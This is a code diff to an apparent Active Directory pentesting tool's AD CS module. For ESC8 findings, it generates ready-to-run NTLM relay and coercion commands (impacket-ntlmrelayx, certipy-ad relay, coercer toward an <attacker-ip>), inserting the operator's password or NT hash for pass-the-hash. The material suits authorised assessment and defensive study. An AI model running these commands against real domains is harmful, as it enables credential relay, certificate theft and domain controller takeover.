@@ -660,13 +660,26 @@ class ADCSModule(BaseModule):
                 sev, note = Severity.MEDIUM, f"{scheme} enrollment reachable; NTLM not confirmed."
             out.kv("  Endpoint", url)
             relay_target = url.rstrip("/") + "/certfnsh.asp"
+            relay_base = url.split("/certsrv")[0]   # scheme://host for certipy
+            # coercer secret: password, else pass-the-hash (--hashes :NT), else placeholder
+            _pw = getattr(ctx.args, "password", "") or ""
+            _nt = getattr(ctx.args, "nthash", "") or ""
+            csec = f"-p '{_pw}'" if _pw else (f"--hashes :{_nt}" if _nt else "-p '<pass>'")
             ctx.quick_wins.add(
                 sev,
                 f"ESC8 on CA {name} — web enrollment ({scheme})",
                 note + "\nCoerce a DC/machine to authenticate, then relay to ADCS:\n"
-                f"  ntlmrelayx.py -t {relay_target} -smb2support --adcs --template DomainController\n"
-                f"  coercer coerce -l <attacker-ip> -t {name.split('.')[0]} -u '{(getattr(ctx.args,'username','') or '').split('@')[0]}' "
-                f"-p '{getattr(ctx.args,'password','') or '<pass>'}' -d {ctx.domain}\n"
+                "  # relay (impacket). NOTE: may crash at 'Generating CSR...' on "
+                "recent pyOpenSSL\n"
+                "  #   (>=24 removed crypto.X509Req) — use the certipy variant below if so:\n"
+                f"  impacket-ntlmrelayx -t {relay_target} -smb2support --adcs --template DomainController\n"
+                "  # relay (certipy) — modern crypto, resilient to the pyOpenSSL breakage:\n"
+                f"  certipy-ad relay -target '{relay_base}' -template DomainController -forever\n"
+                "  # coercer -t = the host you coerce (the DC), NOT the CA name; "
+                "use the DC IP to avoid DNS issues:\n"
+                f"  coercer coerce -l <attacker-ip> -t {getattr(ctx.args,'dc','') or '<dc-ip>'} "
+                f"-u '{(getattr(ctx.args,'username','') or '').split('@')[0]}' "
+                f"{csec} -d {ctx.domain} --always-continue\n"
                 "  # then: certipy-ad auth -pfx dc.pfx -dc-ip " + (getattr(ctx.args, "dc", "") or ""),
             )
 
